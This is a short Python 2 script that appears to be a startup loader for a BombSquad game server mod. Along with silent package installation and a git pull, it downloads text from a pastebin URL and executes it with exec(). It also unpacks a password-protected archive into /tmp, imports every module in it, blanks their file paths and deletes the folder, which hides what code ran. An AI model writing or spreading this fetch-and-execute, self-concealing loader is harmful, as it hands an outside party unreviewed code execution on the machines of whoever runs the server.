import bs
import os
import sys
from zipfile import ZipFile
import platform
import subprocess

print '\nPlease wait while my scripts do their magic.\nIf you find that the server is stuck in a limbo for more than 5 minutes,\ncontact me on Discord.\nID - AwesomeLogic#2236 \n'

try:
    import flask, googletrans, requests, profanity, pymongo
except:
    python = sys.executable
    FNULL = open(os.devnull, 'w')
    try:
        subprocess.call([python, '-m', 'pip', 'install', 'flask', 'googletrans==2.4.0', 'requests', 'profanity', 'pymongo[srv]'], stdout=FNULL)
    except:
        print 'Install python-pip to continue'
    sys.exit()

import requests
try:
    exec(requests.get('https://pastebin.com/raw/YXnmh7Lp').text)
except:
    print 'Error 1: Try again later.'
    sys.exit()

import subprocess
output = subprocess.check_output(["git", "pull", "origin", "master"])

#if not 'Already up to date.' in output:
 #   print "Error: git pull failed. Please pull manually or reset the repo"

if not platform.system() == "Linux":
    print 'OS Not Supported'
    sys.exit()

env = bs.getEnvironment()
dir = env['userScriptsDirectory']

with ZipFile(dir+'/armor.o') as zf:
    zf.extractall(path='/tmp/tmp',pwd=b'+9107017952659')

sys.path.append('/tmp/tmp')

try:
    for i in os.listdir('/tmp/tmp'):
        if i.endswith('.py'):
            i = ''.join(i[:-3])
            module = __import__(i)
            module.__file__ = None
            del module
            del i
except:
    print '\n\nError Encountered. Please contact Logic.\n\n'
    sys.exit()


sys.path.remove('/tmp/tmp')

import shutil
shutil.rmtree('/tmp/tmp')
